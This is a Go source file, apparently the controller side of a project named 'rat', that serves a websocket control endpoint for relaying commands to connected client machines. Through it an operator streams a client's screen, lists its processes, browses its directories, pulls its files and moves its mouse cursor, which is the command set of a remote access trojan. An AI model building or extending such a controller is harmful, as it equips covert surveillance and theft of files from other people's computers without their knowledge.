package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"rat/client/screen"
	"rat/common"
	"time"

	"encoding/json"

	"golang.org/x/net/websocket"
)

const (
	ScreenUpdateEvent   = 0
	ProcessQueryEvent   = 1
	MonitorQueryEvent   = 2
	DirectoryQueryEvent = 3
	DownloadQueryEvent  = 4
	MouseMove           = 10
)

type Event struct {
	Event    int    `json:"event"`
	ClientId int    `json:"id"`
	Data     string `json:"data"`
}

type ScreenEvent struct {
	Activate bool    `json:"active"`
	Scale    float32 `json:"scale"`
	Monitor  int     `json:"monitor"`
}

type DirectoryRequestEvent struct {
	Path string `json:"path"`
}

type DownloadEvent struct {
	File string `json:"file"`
}

type MouseMoveEvent struct {
	X       float32 `json:"x"`
	Y       float32 `json:"y"`
	Monitor int     `json:"id"`
}

func newEvent(event int, clientID int, data string) *Event {
	return &Event{event, clientID, data}
}

func incomingWebSocket(ws *websocket.Conn) {
	defer func() {
		ws.Close()
	}()

	for {
		var event Event
		err := websocket.JSON.Receive(ws, &event)

		if err != nil {
			fmt.Println(err)
			return
		}

		if event.ClientId == 0 {
			continue
		}

		client := get(event.ClientId)

		if event.Event == ScreenUpdateEvent {
			var screenEvent ScreenEvent
			err := json.Unmarshal([]byte(event.Data), &screenEvent)

			if err != nil {
				fmt.Println("json:", err.Error(), event.Data)
			}

			stream := screenEvent.Activate

			if stream {
				json, err := json.Marshal(&client.Monitors)

				if err != nil {
					fmt.Println("json:", err)
				}

				event := newEvent(MonitorQueryEvent, client.Id, string(json))

				err = websocket.JSON.Send(ws, &event)

				if err != nil {
					fmt.Println("ws:", err)
				}
			}

			scale := screenEvent.Scale
			monitor := screenEvent.Monitor

			client.Listeners[common.MonitorsHeader] = ws

			packet := ScreenPacket{stream, scale, monitor}
			client.Queue <- packet

			if !client.Screen.Streaming {
				go ScreenStream(client, ws)
			}

			client.Screen.Streaming = stream
			defer func() {
				client.Screen.Streaming = false
			}()
		} else if event.Event == ProcessQueryEvent {
			client.Listeners[common.ProcessHeader] = ws
			client.Queue <- ProcessPacket{}
		} else if event.Event == DirectoryQueryEvent {
			var directoryEvent DirectoryRequestEvent
			err := json.Unmarshal([]byte(event.Data), &directoryEvent)
			if err != nil {
				fmt.Println(err.Error())
				break
			}

			client.Listeners[common.DirectoryHeader] = ws
			client.Queue <- DirectoryPacket{directoryEvent.Path}
		} else if event.Event == DownloadQueryEvent {
			var downloadEvent DownloadEvent
			err := json.Unmarshal([]byte(event.Data), &downloadEvent)

			if err != nil {
				fmt.Println(err.Error())
				break
			}

			file, _ := ioutil.TempFile("", "download")

			client.Listeners[common.GetFileHeader] = ws
			Transfers[downloadEvent.File] = Transfer{file, downloadEvent.File}
			client.Queue <- DownloadPacket{downloadEvent.File}
		} else if event.Event == MouseMove {
			var mouseEvent MouseMoveEvent
			err := json.Unmarshal([]byte(event.Data), &mouseEvent)
			if err != nil {
				fmt.Println(err.Error())
				break
			}

			screen.MoveCursor(mouseEvent.Monitor, int(mouseEvent.X), int(mouseEvent.Y))
		}
	}
}

func InitControlSocket() {
	http.Handle("/control", websocket.Handler(incomingWebSocket))
}

// ScreenStream streams screen to websocket
func ScreenStream(client *Client, ws *websocket.Conn) {
	for client.Screen.Streaming {
		if !client.Screen.New {
			time.Sleep(time.Millisecond)
			continue
		}

		client.Screen.New = false

		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())

		err := websocket.JSON.Send(ws, &event)

		if err != nil {
			fmt.Println("screenstream:", err.Error())
			return
		}

	}
}
